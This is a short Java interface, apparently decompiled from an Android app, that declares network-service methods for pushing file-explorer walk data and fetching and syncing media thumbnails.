package com.hawkshaw.library.datalayer.network.service;

import a3.e;
import com.hawkshaw.library.datalayer.models.PushFileExplorerWalkRequest;
import com.hawkshaw.library.datalayer.models.PushFileExplorerWalkV2Request;

public interface MediaService {
    Object getPendingThumbnails(e eVar);

    Object pushFileExplorerWalk(PushFileExplorerWalkRequest pushFileExplorerWalkRequest, e eVar);

    Object pushFileExplorerWalkV2(PushFileExplorerWalkV2Request pushFileExplorerWalkV2Request, e eVar);

    Object syncThumbnails(e eVar);
}
